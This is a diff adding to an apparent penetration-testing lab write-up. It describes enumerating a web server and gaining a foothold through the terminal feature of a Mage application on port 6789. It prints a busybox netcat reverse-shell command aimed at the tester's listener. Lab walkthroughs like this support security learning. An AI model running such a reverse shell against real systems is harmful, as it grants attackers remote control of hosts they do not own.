@@ -66,4 +66,24 @@ Key Findings:
 ### Web Enumeration
 
 Web enumeration began with **port 80**, this presented the default Apache page. Further enumeration included inspection of the source code, common files, directories and subdomains, however this did not reveal any useful information and attention shifted to the application hosted on **port 6789**.
+
+![mage](Images/mage.png)
    
+This port was discovered to be hosting the application Mage. Manual enumeration of the interface's menu found the Terminal opttion, this appeared to be provide command execution functionality. 
+
+![menu](Images/menu.png)
+
+![terminal](Images/termina.png)
+
+## Initial Access
+
+A Busybox reverse shell payload was leveraged to achieve an interactive shell on the host system resulting in the initial foothold. 
+```
+busybox nc 192.168.45.202 4444 -e /bin/bash
+```
+
+![terminal_shell](Images/terminal_shell.png)
+
+![shell](Images/shell.png)
+
+
